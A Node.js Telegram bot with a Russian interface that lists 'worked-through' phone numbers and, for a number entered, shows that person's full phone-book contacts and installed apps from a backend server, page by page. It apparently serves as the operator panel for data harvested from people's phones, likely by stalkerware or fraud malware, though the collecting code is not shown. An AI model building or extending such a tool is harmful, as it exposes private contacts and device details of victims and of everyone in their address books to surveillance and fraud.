const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
const token = process.env.TOKEN;
const bot = new TelegramBot(token, { polling: true });
const server = require('./requests/Server')
const main_keyboard = {
    reply_markup: {
        keyboard: [
            [{ text: 'Просмотреть отработанные номера' }, { text: 'Инфа по номеру' }],
        ],
        resize_keyboard: true,
    }
};
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Привет', main_keyboard);
});

bot.onText(/Просмотреть отработанные номера/, async (msg) => {
    const chatId = msg.chat.id;
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            remove_keyboard: false
        }
    };
    const users = await server.getUsers();
    const string_chat = users.map((element) => {
        const user_id = element.ID;
        return user_id;
    }).join('\n');

    bot.sendMessage(chatId, `Отработанные номера\n${string_chat}`, options);
});
bot.onText(/Инфа по номеру/, async (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            remove_keyboard: false
        }
    };
    bot.sendMessage(chatId, 'Введите номер:', options)
        .then(() => {
            bot.once('message', async (msg) => {
                const phoneNumber = msg.text;
                const userdataByPhone = await server.getUserData(phoneNumber.replace(/^\+/, ''));
                const databtns = []
                var appMessages = ''
                var contactMessages = ''
                if (userdataByPhone.data != 'Данные пользователя не найдены') {
                    if (userdataByPhone.data?.userContacts[0]) {
                        contactMessages = userdataByPhone.data.userContacts[0].contacts.map(element => {
                            const name = `Имя: ${element.givenName}`;
                            const phones = `Номера: ${element.phoneNumbers.map(phone => phone.number).join(', ')}`;
                            return `Телефонная книга\n${name}\n${phones}`;
                        });
                        databtns.push({ text: "Контакты", callback_data: "Sendcontacts" })
                    }


                    if (userdataByPhone.data.userApps[0].apps) {
                        appMessages = userdataByPhone.data.userApps[0].apps.map(element => {
                            const label = `Название: ${element.label}`;
                            const packageName = `Название пакета: ${element.packageName}`;
                            return `${label}\n${packageName}`;
                        });
                        databtns.push({ text: "Приложения", callback_data: "Sendapps" })
                    }

                    const message = await bot.sendMessage(chatId, "Выберите данные", {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                databtns
                            ]
                        }
                    })
                    const messagesToSendcontact = contactMessages;
                    const pageSizecontact = 10;
                    const totalPagescontact = Math.ceil(messagesToSendcontact.length / pageSizecontact);
                    let currentPagecontact = 1;

                    const messagesToSendapp = appMessages;
                    const pageSizeapp = 10;
                    const totalPagesapp = Math.ceil(messagesToSendapp.length / pageSizeapp);
                    let currentPageapp = 1;

                    let currentMessageId = null;
                    let paginationMessageId = null;
                    const sendCurrentPage = async (DataChoose) => {
                        let startIndex;
                        let endIndex;
                        let pageMessages;
                        let paginationButtons;
                        let currentPage;
                        let totalPages;
                        
                        if (DataChoose.contacts) {
                            currentPage = currentPagecontact;
                            totalPages = totalPagescontact;
                            startIndex = (currentPage - 1) * pageSizecontact;
                            endIndex = Math.min(startIndex + pageSizecontact, messagesToSendcontact.length);
                            pageMessages = messagesToSendcontact.slice(startIndex, endIndex);
                        } else if (DataChoose.apps) {
                            currentPage = currentPageapp;
                            totalPages = totalPagesapp;
                            startIndex = (currentPage - 1) * pageSizeapp;
                            endIndex = Math.min(startIndex + pageSizeapp, messagesToSendapp.length);
                            pageMessages = messagesToSendapp.slice(startIndex, endIndex);
                        }
                    
                        paginationButtons = [];
                        if (currentPage > 1) {
                            paginationButtons.push({
                                text: '◀️ Пред.',
                                callback_data: 'prev_page'
                            });
                        }
                        if (currentPage < totalPages) {
                            paginationButtons.push({
                                text: 'След. ▶️',
                                callback_data: 'next_page'
                            });
                        }
                    
                        const messageText = pageMessages.map(message => `<pre>${message}</pre>`).join('\n');
                    
                        if (currentMessageId) {
                            try {
                                await bot.editMessageText(`${messageText}`, {
                                    chat_id: chatId,
                                    message_id: currentMessageId,
                                    parse_mode: 'HTML',
                                    reply_markup: {
                                        inline_keyboard: [paginationButtons]
                                    }
                                });
                            } catch (error) {
                                
                            }
                        } else {
                            const message = await bot.sendMessage(chatId, `${messageText}`, {
                                parse_mode: 'HTML',
                                reply_markup: {
                                    inline_keyboard: [paginationButtons]
                                }
                            });
                            currentMessageId = message.message_id;
                        }
                    };
                    
                    const DataChoose = { contacts: false, apps: false }
                    bot.on('callback_query', async (query) => {
                        try {
                            if (query.data === "Sendcontacts") {
                                DataChoose.contacts = true
                                DataChoose.apps = false
                            } else if (query.data === "Sendapps") {
                                DataChoose.apps = true
                                DataChoose.contacts = false
                            }
                            if (query.data === 'prev_page') {
                                if (DataChoose.contacts) {
                                    currentPagecontact = Math.max(1, currentPagecontact - 1);
                                } else if (DataChoose.apps) {
                                    currentPageapp = Math.max(1, currentPageapp - 1);
                                }
                            } else if (query.data === 'next_page') {
                                if (DataChoose.contacts) {
                                    currentPagecontact = Math.min(totalPagescontact, currentPagecontact + 1);
                                } else if (DataChoose.apps) {
                                    currentPageapp = Math.min(totalPagesapp, currentPageapp + 1);
                                }
                            }
                            sendCurrentPage(DataChoose);
                        } catch (error) {
                            console.log(error.message)
                        }
                    });
                } else {
                    await bot.sendMessage(chatId, 'Номер не найден')
                }

            });
        });
});